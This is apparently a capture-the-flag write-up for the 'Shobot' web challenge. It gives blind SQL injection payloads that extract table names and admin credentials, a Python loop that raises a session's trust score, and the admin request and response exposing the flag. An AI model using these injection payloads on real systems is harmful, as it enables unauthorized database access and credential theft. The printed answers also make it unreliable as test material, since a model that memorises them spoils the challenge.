# Shobot - Web - 200 pts - realized by Blaklis

SQL Injection locator:

```
GET /?page=article&artid=3'-2-'&addToCart HTTP/1.1   # Shogirl   (1)
GET /?page=article&artid=3'-1-'&addToCart HTTP/1.1   # Shobot    (2)
GET /?page=article&artid=3'-0-'&addToCart HTTP/1.1   # Musclebot (3)
GET /?page=article&artid=77'-76-'&addToCart HTTP/1.1 # Shogirl   (1)
```

To extract the data:

```
GET /?page=article&artid=3'-if(ascii(substring((select+concat(table_name)+from+information_schema.tables+where+table_schema=database()+limit+1,1),3,1))<55,1,2)-'&addToCart HTTP/1.1
GET /?page=article&artid=3'-if(ascii(substring((select+concat(table_name)+from+information_schema.tables+where+table_schema=database()+limit+1,1),3,1))>55,1,2)-'&addToCart HTTP/1.1
```

```
# select+shbt_username+from+shbt_user
sh0b0t4dm1n

# select+shbt_userpassword+from+shbt_user
N0T0R0B0TS$L4V3Ry
```

Extending verification trust: 

```python
#!/usr/bin/env python

import requests
import time
from sys import stdout

cookie = {'PHPSESSID': '0kc58sh0d0dqo4ool08lkf0en2'}

while True:
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=article&artid=1&addToCart', cookies=cookie)
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=article&artid=2&addToCart', cookies=cookie)
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=article&artid=3&addToCart', cookies=cookie)
    r = requests.get('http://shobot.teaser.insomnihack.ch/?page=cartconfirm', cookies=cookie)
    stdout.write('.')
    stdout.flush()
    time.sleep(0.5)
```

Solution (after we finally dump the data with custom script):

```
GET /?page=admin HTTP/1.1
Authorization: Basic c2gwYjB0NGRtMW46TjBUMFIwQjBUUyRMNFYzUnk=
Host: shobot.teaser.insomnihack.ch
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:50.0) Gecko/20100101 Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1

```

```
HTTP/1.1 200 OK
Date: Sun, 22 Jan 2017 16:20:16 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 1405
Connection: close
Server: Apache/2.4.18 (Ubuntu)
Vary: User-Agent,Accept-Encoding
Set-Cookie: PHPSESSID=j2d4kq5g624csph7798i4glfc6; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache

<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>Shobot</title>
    <link rel="stylesheet" href="style.css"/>
    <script>
      // @TODO LATER : Use it for generate some better error messages
      var TRUST_ACTIONS = []    </script>
  </head>
  <body>
    <header>
      <img src="imgs/shogirl.png"/>
      <span id="site-title">Shobot</span>
      <span id="site-slogan">Your shop for robots!</span>
      <div id="menu"><img src='imgs/menu.png'/></div>
      <div id="menu-scrolled">
        <div class="menu-entry"><a href="?page=home">Home</a></div>
        <div class="menu-entry"><a href="?page=articles">Products</a></div>
        <div class="menu-entry"><a href="?page=cart">My cart</a></div>
        <!--<div class="menu-entry"><a href="?page=admin">Admin</a></div>-->
      </div>
    </header>
<div id="content-text">
Ok, ok, you win... here is the code you search : INS{##r0b0tss!4v3ry1s!4m3}
</div>
<script>
  document.getElementById('menu').onclick = function() {
    if(document.getElementById('menu').getAttribute('data-active') == 'active') {
      document.getElementById('menu').removeAttribute('data-active');
      document.getElementById('menu-scrolled').removeAttribute('data-active');
    } else {
      document.getElementById('menu').setAttribute('data-active', 'active');
      document.getElementById('menu-scrolled').setAttribute('data-active', 'active');
    }
  };
</script>
</body>
</html>
```
